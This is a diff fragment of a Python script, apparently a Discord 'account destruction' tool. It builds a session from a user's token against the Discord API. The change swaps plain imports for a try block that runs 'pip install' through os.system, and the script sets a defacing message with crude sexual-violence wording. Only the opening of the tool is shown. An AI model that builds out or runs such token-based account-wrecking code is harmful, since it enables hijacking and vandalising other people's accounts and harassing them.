@@ -1,13 +1,17 @@
-import requests, base64, asyncio, json, os
+import base64, asyncio, json, os
 
-from colorama import Fore, init
+try:
+    import requests
+    from colorama import Fore, init
+except (ModuleNotFoundError):
+    os.system('pip install requests colorama')
+
 init(convert=True)
 
 class Destruction:
     def __init__(self, token):
         self.api = 'https://discord.com/api/v8/'
         self.message = { 'content' : "", "tts" : "False", "embed": { "description": "This account was booty raped... "} }
-
         self.user = None
         self.token = token
         self.session = requests.Session()
